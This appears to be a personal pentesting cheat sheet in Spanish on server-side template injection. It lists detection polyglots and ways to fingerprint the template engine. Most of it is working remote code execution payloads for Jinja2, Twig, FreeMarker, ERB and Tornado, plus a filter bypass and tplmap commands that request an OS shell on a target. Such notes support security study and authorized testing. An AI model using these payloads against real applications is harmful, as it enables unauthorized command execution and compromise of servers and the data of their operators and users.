---
tags: [web, ssti, rce]
status: done
---

# SSTI — Server-Side Template Injection

---

## Concepto

Input del usuario se renderiza dentro de un template engine en el servidor → si no se sanitiza → ejecución de código.

---

## Detección — Polyglot

```
# Payload que rompe templates de diferentes engines
${{<%['"}}%\.

# Matemáticas para confirmar (cada engine tiene sintaxis distinta)
{{7*7}}         → 49  → Jinja2 / Twig / Smarty
#{7*7}          → 49  → Ruby ERB / Pebble
${7*7}          → 49  → FreeMarker / Thymeleaf
<%= 7*7 %>      → 49  → ERB (Ruby)
{7*7}           → 49  → Smarty (alternativa)
*{7*7}          → 49  → Thymeleaf (Spring)
```

---

## Identificación del Engine

```
{{7*'7'}}
→ 7777777  → Jinja2 (Python)
→ 49       → Twig (PHP)

{{config}}
→ objeto config visible → Jinja2 casi seguro
```

---

## Jinja2 (Python / Flask)

```python
# Confirmar
{{7*7}}

# Listar config
{{config}}

# RCE — método 1 (via MRO)
{{''.__class__.__mro__[1].__subclasses__()}}
# Buscar índice de <class 'subprocess.Popen'>
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}

# RCE — método 2 (más limpio, Jinja2 moderno)
{{self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# RCE — lipsum (disponible en Flask por defecto)
{{lipsum.__globals__['os'].popen('id').read()}}

# Bypass si bloquean punto (.)
{{()|attr('__class__')|attr('__mro__')}}
```

---

## Twig (PHP / Symfony)

```php
// Confirmar
{{7*7}}

// Información
{{_self.env.getExtension('Twig_Extension_Debug')}}

// RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

// Alternativa
{{['id']|filter('system')}}
{{['id',""]|sort('system')}}
```

---

## FreeMarker (Java)

```java
// Confirmar
${7*7}

// RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

// Alternativa
${product.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

## ERB (Ruby / Rails)

```ruby
# Confirmar
<%= 7*7 %>

# RCE
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").read %>
```

---

## Tornado (Python)

```python
# Confirmar
{{7*7}}

# RCE
{%import os%}{{os.system('id')}}
```

---

## Herramientas

```bash
# tplmap — automatiza detección y explotación
python3 tplmap.py -u "https://target.com/page?name=test"
python3 tplmap.py -u "https://target.com/page?name=test" --os-shell

# Burp Suite — identificar reflexión en respuesta → probar payload manualmente
```

